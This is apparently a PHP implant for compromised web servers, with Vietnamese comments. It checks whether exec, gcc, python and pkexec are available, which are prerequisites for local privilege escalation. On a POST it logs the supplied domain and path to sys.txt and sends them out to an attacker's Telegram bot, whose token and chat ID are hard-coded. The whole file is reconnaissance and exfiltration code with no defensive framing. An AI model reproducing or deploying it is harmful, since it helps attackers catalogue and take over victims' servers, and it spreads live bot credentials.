<?php
// Function to check if a command exists
function commandExists($command) {
    $output = [];
    $result = 0;
    exec("command -v $command", $output, $result);
    return $result === 0;
}

// Function to check if a PHP function is enabled
function isFunctionEnabled($function) {
    return in_array($function, get_defined_functions()['internal']);
}

// Check system functions and command availability
$systemFunctionEnabled = isFunctionEnabled('exec');
$gccInstalled = commandExists('gcc');
$pythonInstalled = commandExists('python');
$pkexecInstalled = commandExists('pkexec');

// Nếu tất cả đều ON, gửi thông tin qua Telegram
if ($systemFunctionEnabled && $gccInstalled && $pythonInstalled && $pkexecInstalled) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);

        if (isset($data['domain'], $data['path'], $data['filename'])) {
            $domain = rtrim($data['domain'], '/'); // Đảm bảo không có dấu '/' ở cuối
            $path = ltrim($data['path'], '/'); // Đảm bảo không có dấu '/' ở đầu
            $filename = $data['filename'];

            // Lấy ngày giờ hiện tại
            $dateTime = date('d/m/Y H:i:s');

            $file = 'sys.txt';
            // Tạo đường dẫn đầy đủ
            $fullPath = "$domain/$path"; // Đường dẫn đầy đủ không cần filename

            // Cấu trúc nội dung theo định dạng yêu cầu
            $content = "Domain: $domain\nDate: $dateTime\nFull Path: $fullPath\n";

            // Ghi vào sys.txt
            file_put_contents($file, "------\n$content", FILE_APPEND);

            // Gửi thông tin đến Telegram
            $chat_id = '7416297295';
            $bot_token = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
            $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($content);

            // Gửi yêu cầu đến Telegram
            file_get_contents($telegram_url);
        }
    }
}
?>
